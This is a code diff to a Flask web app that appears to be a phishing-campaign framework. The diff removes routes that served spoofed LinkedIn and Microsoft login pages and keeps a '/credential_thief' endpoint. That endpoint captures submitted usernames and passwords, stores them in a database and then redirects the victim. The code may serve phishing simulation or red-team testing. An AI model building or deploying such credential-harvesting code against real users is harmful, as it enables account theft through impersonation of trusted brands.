@@ -193,51 +193,25 @@ def website_template():
     update_page("website_template", "website-template.html")
     return login_check(wt=kore.template_website_template.get_templates(), error=error)
 
-###############[ ERROR HANDLING ]########################
-@routes.route('/error')
-def error():
-    pass
-
-#########[ DEBUG CRAP - REMOVE BEFORE PR ]##############
-@routes.route('/linkedin', methods=["GET", "POST"])
-def linkedin():
-    return render_template("spoofed_website_templates/linkedin/index.html")
- 
-@routes.route('/microsoft', methods=["GET", "POST"])
-def microsoft():
-    return render_template("spoofed_website_templates/microsoft/index.html")
-
-@routes.route('/microsoft/<path:filename>', methods=["GET", "POST"])
-def microsoft_aux_files(filename):
-    return render_template("spoofed_website_templates/microsoft/" + filename)
 
 @routes.route("/credential_thief", methods=["GET", "POST"])
 def hijack_creds():
-    #dict = request.form
-    dict = {"username" : request.form['username'],
+    dic = { "username" : request.form['username'],
             "password" : request.form['password'],
             "redirect_url" : request.form['redirect_url'],
             "campaign" : request.form['campaign']
            }
+    kore.query.credential_thief_result(dic, db)
+    return redirect(url_for("routes." + dic["redirect_url"]))
 
-    print "-" * 80
-    for key in dict:
-        print "\t" + key + ':' + dict[key]
-    print "-" * 80
-
-    return redirect(url_for("routes." + dict["redirect_url"]))
 
 @routes.route("/survey_stage", methods=["GET", "POST"])
 def survey():
     if request.method == 'POST':
-        print "-" * 80
-        for key in request.form:
-            print "\t" + key + ':' + request.form[key]
-        print "-" * 80
+        kore.query.survey_result(request.form, db)
     return render_template("active_campaign_templates/survey.html", request=request)
 
 
-###############[ END DEBUG ]############################
 app.register_blueprint(routes)
 
 if __name__ == '__main__':
